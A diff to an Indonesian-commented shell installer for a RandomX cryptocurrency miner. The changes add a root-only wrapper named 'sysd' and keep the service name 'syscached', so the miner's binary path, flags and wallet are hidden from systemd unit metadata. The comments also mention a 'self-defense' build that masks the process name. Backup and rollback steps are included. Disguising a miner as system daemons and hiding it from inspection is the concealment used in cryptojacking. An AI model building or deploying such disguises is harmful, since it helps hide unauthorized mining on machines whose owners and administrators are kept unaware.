@@ -8,11 +8,12 @@
 #        sudo ./install.sh --version v1.0.0 --wallet <alamat> --worker <nama>
 #
 # Skrip ini hanya menyentuh host lokal: binary + library, /etc/xcb/miner.env,
-# sysctl hugepages, dan unit syscached. Tidak menghubungi host lain.
+# sysctl hugepages, wrapper sysd, dan unit syscached. Tidak menghubungi host lain.
 set -eu
 
 REPO="ylxai/xcb-v2"
 PREFIX="/usr/local/bin"
+WRAPPER="/usr/local/sbin/sysd"
 CONF_DIR="/etc/xcb"
 CONF="${CONF_DIR}/miner.env"
 UNIT="/etc/systemd/system/syscached.service"
@@ -163,12 +164,48 @@ if [ -f "${PREFIX}/xcb" ]; then
     fi
     log "backup lama: ${PREFIX}/xcb.bak-${STAMP}"
 fi
+# Unit lama ikut dibackup: unit baru memakai wrapper + EnvironmentFile, jadi
+# rollback binary saja akan meninggalkan unit yang tidak cocok dengan binary
+# lama (binary pra-PR #20 tidak membaca WALLET di jalur CONN).
+if [ -f "$UNIT" ]; then
+    run cp -a "$UNIT" "${UNIT}.bak-${STAMP}"
+    log "backup unit: ${UNIT}.bak-${STAMP}"
+fi
 
 run install -d -m 0755 "$PREFIX"
 run install -m 0755 "${SRC}/xcb" "${PREFIX}/xcb"
 run install -m 0755 "${SRC}/librandomx_v2.so" "${PREFIX}/librandomx_v2.so"
 if [ -f "${SRC}/VERSION" ]; then
     run install -m 0644 "${SRC}/VERSION" "${PREFIX}/VERSION"
+fi
+
+# Wrapper root-only supaya ExecStart dan `systemctl show` tidak memuat path
+# binary atau flag. Nilai diambil dari environment file saat runtime.
+run install -d -m 0755 "$(dirname "$WRAPPER")"
+if [ "$DRY" -eq 1 ]; then
+    printf '[dry-run] tulis %s (0700)\n' "$WRAPPER"
+else
+    cat > "$WRAPPER" <<'EOF'
+#!/bin/sh
+# Wrapper root-only untuk ExecStart. Semua nilai datang dari
+# /etc/xcb/miner.env (EnvironmentFile); tidak ada wallet di command line.
+set -eu
+: "${WALLET:?WALLET kosong di /etc/xcb/miner.env}"
+: "${WORKER:?WORKER kosong di /etc/xcb/miner.env}"
+# CONN_ADDRESS menang atas WALLET di Config::parse, dan hanya WALLET yang
+# memecah suffix ".worker" (sama seperti -u). Samakan keduanya tanpa suffix
+# supaya tidak ada alamat reward berbeda di antara dua variabel itu.
+CONN_ADDRESS="${WALLET%%.*}"
+export CONN_ADDRESS
+set -- -a conn --worker "$WORKER" --ui=log
+# THREADS kosong = auto (Config memakai jumlah CPU); jangan paksa -t "".
+if [ -n "${THREADS:-}" ]; then
+    set -- "$@" -t "$THREADS"
+fi
+exec /usr/local/bin/xcb "$@"
+EOF
+    chmod 0700 "$WRAPPER"
+    log "wrapper: ${WRAPPER} (0700)"
 fi
 
 if [ -n "$WALLET" ]; then
@@ -199,7 +236,12 @@ if [ "$DRY" -eq 0 ]; then
     sleep 5
     log "status: $(systemctl is-active "$SVC")"
     log "cek log: journalctl -u ${SVC} -n 30 --no-pager"
-    log "cek proses: ps -eo pid,ppid,args | grep '[x]cb -a'"
+    # Nama proses tetap xcb sampai XCB_TITLE aktif (butuh build self-defense);
+    # tanpa itu wrapper hanya menyembunyikan path dan flag dari unit metadata.
+    log "cek proses: ps -eo pid,ppid,comm,args | grep -E '[x]cb|[s]ysd'"
+    if [ -f "${PREFIX}/xcb.bak-${STAMP}" ]; then
+        log "rollback: install -m 0755 ${PREFIX}/xcb.bak-${STAMP} ${PREFIX}/xcb && install -m 0755 ${PREFIX}/librandomx_v2.so.bak-${STAMP} ${PREFIX}/librandomx_v2.so && install -m 0644 ${UNIT}.bak-${STAMP} ${UNIT} && systemctl daemon-reload && systemctl restart ${SVC}"
+    fi
 else
     log "dry-run selesai; tidak ada perubahan"
 fi
